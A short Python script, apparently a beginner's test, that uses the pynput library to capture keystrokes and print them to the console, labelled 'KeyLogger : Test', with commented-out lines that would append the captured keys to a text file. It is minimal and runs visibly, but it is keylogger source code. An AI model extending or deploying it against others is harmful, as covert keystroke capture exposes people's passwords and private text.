from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        print (key.char)
    except:
        print (key)
    if key == Key.esc:
        return False
   # print(key.char) #test print(key) , print(str(key))

# Collect events until released
print ("< KeyLogger : Test >")
print ("--------------------")
print ()

with Listener(on_press=on_press) as listener:
    listener.join()
 #   with open("data.txt", 'a') as file:
 #        file.write(listener.join())
